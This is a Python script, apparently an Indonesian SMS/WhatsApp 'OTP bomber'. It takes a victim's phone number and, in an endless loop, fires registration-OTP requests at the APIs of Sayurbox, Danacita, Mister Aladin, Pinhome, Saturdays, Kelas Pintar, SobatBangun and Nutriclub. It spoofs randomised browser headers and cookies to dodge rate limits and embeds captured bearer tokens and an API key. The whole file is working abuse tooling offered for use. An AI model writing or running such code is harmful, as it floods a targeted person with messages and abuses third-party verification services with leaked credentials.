import os, sys, time, json, requests
from colorama import Fore, init
from sys import argv
import random
import uuid

init(autoreset=True)

def autotype(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008)

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW

hijau = "\033[1;92m"
putih = "\033[1;97m"
biru = "\033[1;96m"
kuning = "\033[1;93m"

def generate_user_agent():
    browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
    os = ['Windows', 'Macintosh', 'Linux', 'Android', 'iOS']
    browser_version = random.randint(50, 90)
    os_version = random.randint(10, 15)
    return f"Mozilla/5.0 ({random.choice(os)} NT {os_version}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{browser_version}.0.4472.124 Safari/537.36"

def generate_accept_language():
    languages = ['en-US', 'id-ID', 'es-ES', 'zh-CN', 'ms-MY', 'ca-ES', 'pt-BR']
    random.shuffle(languages)
    return ','.join([f"{lang};q={round(random.uniform(0.1, 1.0), 1)}" for lang in languages])

def generate_cookie():
    return f"perf_dv6Tr4n={random.randint(1, 10)}; _gcl_au=1.1.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; amp_9bff24={uuid.uuid4()}...1i0tkmf66.1i0tkmf66.0.0.0; _gid=GA1.3.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; _gat_UA-106864485-1=1; _fbp=fb.2.{random.randint(1000000000, 1999999999)}.{random.randint(1000000000000, 1999999999999)}; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-20881%2C180.244.163.61%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CID; _ga_M6EGHSCWF7=GS1.1.{random.randint(1000000000, 1999999999)}.1.0.{random.randint(1000000000, 1999999999)}.57.0.0; ph_phc_3JD9yqRALGfavssFolNlgAlqrFJxXWoSMRypaScrcHv_posthog=%7B%22distinct_id%22%3A%22{uuid.uuid4()}%22%2C%22%24sesid%22%3A%5B{random.randint(1000000000, 1999999999)}%2C%22{uuid.uuid4()}%22%2C{random.randint(1000000000, 1999999999)}%5D%7D; _ga=GA1.1.{random.randint(1000000000, 1999999999)}; cebsp_=2; _ga_V9673QHFM5=GS1.1.{random.randint(1000000000, 1999999999)}.1.1.{random.randint(1000000000, 1999999999)}.38.0.0; _ce.s=v~26dae470825c19828984ea7d7dbfd066418b156c~lcw~{random.randint(1000000000, 1999999999)}~lva~{random.randint(1000000000, 1999999999)}~vpv~0~as~false~v11.fhb~{random.randint(1000000000, 1999999999)}~v11.lhb~{random.randint(1000000000, 1999999999)}~v11.cs~{random.randint(100000, 999999)}~v11.s~{uuid.uuid4()}~gtrk.la~lxotc4r2~v11.sla~{random.randint(1000000000, 1999999999)}~lcw~{random.randint(1000000000, 1999999999)}"

def generate_sec_ch_ua():
    brands = ['Not/A)Brand', 'Chromium', 'Google Chrome', 'Microsoft Edge', 'Safari']
    versions = [str(random.randint(70, 130)) for _ in range(3)]
    return f"\"{random.choice(brands)}\";v=\"{versions[0]}\", \"{random.choice(brands)}\";v=\"{versions[1]}\", \"{random.choice(brands)}\";v=\"{versions[2]}\""

def generate_sec_ch_ua_platform():
    platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
    return f"\"{random.choice(platforms)}\""

inputNomer = argv[1]
nomor_matahari = inputNomer.replace("+62", "0")
nomor_mraladin = inputNomer.replace("+62", "")
nomor_pinhome = inputNomer.replace("+62", "")
nomor_saturdays = inputNomer.replace("+62", "")
nomor_redbus = inputNomer.replace("+62", "")
nomor_saturdays = inputNomer.replace("+62", "")
nomor_pinhome = inputNomer.replace("+62", "")
nomor_sobatbangun = inputNomer.replace("+62", "62")
nomor_nutriclub = inputNomer.replace("+62", "0")
nomor_ruangguru = inputNomer.replace("+62", "62")

while True:
    # Sayurbox
    headers_sayurbox = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': generate_accept_language(),
        'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzE5MjM1OTQ4LCJleHAiOjE3MjE4Mjc5NDgsImlhdCI6MTcxOTIzNTk0OCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjJkOWVlZGI0LTNmYjMtNDIzMi1hODFiLWY1NzljZDAyMzMwYiIsInN1YiI6ImFfcjB6RkF0cFRVa3NJUnlEWnlha1MxckQ2c3oiLCJ1c2VyX2lkIjoiYV9yMHpGQXRwVFVrc0lSeURaeWFrUzFyRDZzeiJ9.BWTgVDTwf0HPpEKb7yd3vNqvTYzoNmLlV-oAeCZqcxo7eYASpmWZtFsOQl_pNtPXeeWIob26X10pAA7-olFN3Pp3k9Pi-qC-qbL3TeC1vS80Xe5JEHyM7ParZmZJjPUtQD1FDjnHHcTGiS4Z4KmlzLuvAltedEUxv-YC-c8SjJSxRvWrgY6JqTu9Bn1qDRf08pD-3Bx3wZhVDgGNgGOYh65WrU1z-nLzYuYgwhgNPYv79qMUaUm2KD0IS30rNgRaYnKk7kleXxzgEPdYnbp-0DiFfuky7qtL9n4MSc86EvpYMNyf4HnggQqT2R3pOcwiN0xa_NQRz3id4xJ8ZJNBWA',
        'Content-Length': str(random.randint(100, 200)),
        'Content-Type': 'application/json',
        'Cookie': 'perf_dv6Tr4n=1; _gcl_au=1.1.453795563.1718975654; _ga=GA1.1.1863538960.1718975654; _fbp=fb.1.1718975655048.519782181988016639; afUserId=ce18733b-0c78-451f-9579-c6300baa97db-p; AF_SYNC=1718975655764; _sbox_lang=id; __cnf=cnf0927; token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzE5MjM1OTQ4LCJleHAiOjE3MjE4Mjc5NDgsImlhdCI6MTcxOTIzNTk0OCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjJkOWVlZGI0LTNmYjMtNDIzMi1hODFiLWY1NzljZDAyMzMwYiIsInN1YiI6ImFfcjB6RkF0cFRVa3NJUnlEWnlha1MxckQ2c3oiLCJ1c2VyX2lkIjoiYV9yMHpGQXRwVFVrc0lSeURaeWFrUzFyRDZzeiJ9.BWTgVDTwf0HPpEKb7yd3vNqvTYzoNmLlV-oAeCZqcxo7eYASpmWZtFsOQl_pNtPXeeWIob26X10pAA7-olFN3Pp3k9Pi-qC-qbL3TeC1vS80Xe5JEHyM7ParZmZJjPUtQD1FDjnHHcTGiS4Z4KmlzLuvAltedEUxv-YC-c8SjJSxRvWrgY6JqTu9Bn1qDRf08pD-3Bx3wZhVDgGNgGOYh65WrU1z-nLzYuYgwhgNPYv79qMUaUm2KD0IS30rNgRaYnKk7kleXxzgEPdYnbp-0DiFfuky7qtL9n4MSc86EvpYMNyf4HnggQqT2R3pOcwiN0xa_NQRz3id4xJ8ZJNBWA; localSessionId=lk0uc8P05F_9Iagy1q7kK:1719235924953; localSessionIdExpire=1719235924953; _ga_RG03K1J7BE=GS1.1.1719235925.7.0.1719235925.0.0.0; _ga_MHTN2YH4H8=GS1.1.1719235925.7.1.1719235953.32.0.0',
        'Origin': 'https://www.sayurbox.com',
        'Priority': 'u=1, i',
        'Sec-Ch-Ua': generate_sec_ch_ua(),
        'Sec-Ch-Ua-Mobile': f"?{random.randint(0, 1)}",
        'Sec-Ch-Ua-Platform': generate_sec_ch_ua_platform(),
        'Sec-Fetch-Dest': random.choice(["empty", "document", "iframe"]),
        'Sec-Fetch-Mode': random.choice(["cors", "navigate", "no-cors"]),
        'Sec-Fetch-Site': random.choice(["same-site", "same-origin", "cross-site"]),
        'User-Agent': generate_user_agent(),
        'X-Binary-Version': '2.21.2',
        'X-Bundle-Revision': '60.4',
        'X-Device-Info': '{"platform":"web","is_app":false,"is_mobile":false,"device_type":"desktop","device_id":"lk0uc8P05F_9Iagy1q7kK","os_name":"Windows","os_version":"NT 10.0","brand":null,"model":null,"pixel_density":1.125,"client_ip":"::ffff:10.10.195.16"}',
        'X-Sbox-Lang': 'id',
        'X-Sbox-Tenant': 'b2c',
        'X-Supported-Delivery': 'NEXTDAY,SAMEDAY,INSTANT'
    }
    
    data_whatsapp_sayurbox = json.dumps({
            "operationName": "generateOTP",
            "variables": {
                "destinationType": "whatsapp",
                "identity": inputNomer
            },
            "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
        })
    
    response_sayurbox_wa = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_whatsapp_sayurbox)
    if response_sayurbox_wa.status_code == 200:
        print(f"{hijau}Berhasil mengirim Whatsapp {inputNomer} via SayurBox")
    else:
        print(f"{R}Gagal mengirim Whatsapp {inputNomer} via SayurBox")

    headers_danacita = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Content-Length": str(random.randint(20, 50)), 
        "Content-Type": "application/json",
        "Cookie": generate_cookie(),
        "Origin": "https://app.danacita.co.id",
        "Referer": "https://app.danacita.co.id/",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent()
	}
    
    data_danacita = json.dumps({
        "username": inputNomer,
	})
    
    
    response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
    if response_danacita.status_code == 200:
        print(f"{hijau}Berhasil Mengirim SMS/WA To : {inputNomer} via Danacita")
    else:
        print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Danacita")
        
    headers_misterAladin = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer null",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json;charset=UTF-8",
        "Cookie": "offer_id=103180; utm_source=involveasia; _ga=GA1.2.40616470.1718982768; _gid=GA1.2.1272049545.1718982768; Lda_aKUr6BGRn=everydaysi.com/r/v2?; G_ENABLED_IDPS=google; Ac_aqK8DtrDL=1; Fm_kZf8ZQvmX=1; __cfruid=de4c77417ef8c7b1aab81ffb4fceadf9762578dc-1719067746; click_id=710414e9316844668c613db0eb3e8f7f; utm_medium=1637-710414e9316844668c613db0eb3e8f7f; _gat=1; _ga_PLKRYTK7YG=GS1.2.1719067732.2.1.1719067735.57.0.0",
        "Origin": "https://www.misteraladin.com",
        "Priority": "u=1, i",
        "Referer": "https://www.misteraladin.com/register",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Platform": "web"
	}
    
    data_misterAladin = json.dumps({
        "phone_number_country_code": "62",
        "phone_number": nomor_mraladin,
        "type": "register"
	})
    
    response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin)
    if response_mraladin.status_code == 200:
        print(f"{hijau}Berhasil Mengirim SMS/WA To : {inputNomer} via Mister Aladin")
    else: 
        print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Mister Aladin")

    #pinhome
    headers_pinhome = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json",
        "Cookie": "_gcl_au=1.1.246269231.1718959212; _fbp=fb.1.1718959212234.210660632162219433; _gcl_au=1.1.246269231.1718959212; _ga=GA1.1.127919491.1718959212; _fbp=fb.1.1718959212234.210660632162219433; _ga_CYRVZ1HEXG=GS1.1.1718959211.1.0.1718959212.0.0.0; _hhcftd=1618a140204983c645ecd5c7e4f60381cdecf115; _clck=1iujwii%7C2%7Cfmv%7C0%7C1633; _clsk=hty05m%7C1719102661534%7C1%7C1%7Ch.clarity.ms%2Fcollect; ph_phc_vIu9D3s1qIMPGaAkpBsgyBhRUFKtuyS7qUqeo35W873_posthog=%7B%22distinct_id%22%3A%22019039f4-0639-73c4-bba9-8c71ae7a0b93%22%2C%22%24sesid%22%3A%5B1719102662482%2C%2201904280-df2e-7d49-b1ac-8ece3e8cb4fd%22%2C1719102660398%5D%7D; _gid=GA1.2.275863447.1719102663; _ga_Y1EHRSKVLJ=GS1.1.1719102663.1.0.1719102663.60.0.0; _ga=GA1.2.127919491.1718959212; _ga_CYRVZ1HEXG=GS1.1.1719102660.2.1.1719102667.0.0.0",
        "Origin": "https://www.pinhome.id",
        "Priority": "u=1, i",
        "Referer": "https://www.pinhome.id/daftar",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Auth": "Bearer 63cb746000e1f88adaede0b65928daecac1914832d5fb20538209a76ae1754ea"
    }
    
    data_pinhome = json.dumps({
        "accountType": "customers",
        "countryCode": "62",
        "medium": "whatsapp",
        "otpType": "register",
        "phoneNumber": nomor_pinhome
    })
    
    response_pinhome = requests.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome)
    if response_pinhome.status_code == 201:
        print(f"{hijau}Berhasil Mengirim SMS/WA To : {inputNomer} via Pinhome")
    else:
        print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Pinhome")
        
        
    headers_saturdays = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "undefined", 
        "Connection": "keep-alive",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json",
        "Country-Code": "ID",
        "Currency-Code": "IDR",
        "Device-Type": "dweb",
        "Host": "beta.api.saturdays.com",
        "Origin": "https://saturdays.com",
        "Platform": "dweb",
        "Referer": "https://saturdays.com/",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Api-Key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
    }

    data_saturdays = json.dumps({
        "number": nomor_saturdays,
        "countryCode": "+62",
        "type": "MSG"
    })
    
    response_saturdays = requests.post("https://beta.api.saturdays.com/api/v1/user/otp/send", headers=headers_saturdays, data=data_saturdays)
    if response_saturdays.status_code == 200:
        print(f"{hijau}Berhasil Mengirim SMS/WA To : {inputNomer} via Saturdays")
    else:
        print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Saturdays")
  
    headers_kelaspintar = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer undefined",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json",
        "Origin": "https://www.kelaspintar.id",
        "Priority": "u=1, i",
        "Referer": "https://www.kelaspintar.id/",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent()
    }
    
    data_kelaspintar = json.dumps({
        "phone_number": inputNomer,
    })
    
    response_kelaspintar = requests.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar)
    if response_kelaspintar.status_code == 200:
        print(f"{hijau}Berhasil Mengirim SMS/WA To : {inputNomer} via Kelas Pintar")
    else:
        print(f"{R}Gagal mengirim SMS/WA To : {inputNomer} via Kelas Pintar")
        
    headers_sobatbang = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Content-Length": str(random.randint(100, 200)),
        "Content-Type": "application/json",
        "Origin": "https://www.sobatbangun.com",
        "Priority": "u=1, i",
        "Referer": "https://www.sobatbangun.com/",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent()
    }
    
    data_sobatbangun = json.dumps({
        "email_or_phone": nomor_sobatbangun,
    })
    
    response_sobatbangun = requests.post("https://api.sobatbangun.com/auth/otp/send-otp", headers=headers_sobatbang, data=data_sobatbangun)
    if response_sobatbangun.status_code == 201:
        print(f"{G}Berhasil mengirim OTP via SobatBangun")
    else:
        print(f"{R}Gagal mengirim OTP via SobatBangun")
        
    headers_nutriclub = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Content-Length": str(random.randint(100, 200)),
        "Origin": "https://www.nutriclub.co.id",
        "Priority": "u=1, i",
        "Referer": "https://www.nutriclub.co.id/membership/registration",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Requested-With": "XMLHttpRequest"
    }
    
    data_nutriclub = json.dumps({
        "phone": nomor_nutriclub,
        "old_phone": nomor_nutriclub,
    })
    
    response_data_nutriclub = requests.post(f"https://www.nutriclub.co.id/membership/otp/?phone={nomor_nutriclub}&old_phone={nomor_nutriclub}", headers=headers_nutriclub, data=data_nutriclub)
    if response_data_nutriclub.status_code == 200:
        print(f"{G}Berhasil mengirim OTP To: {inputNomer} via Nutriclub")
    else:
        print(f"{R}Gagal mengirim OTP To: {inputNomer} via Nutriclub")
        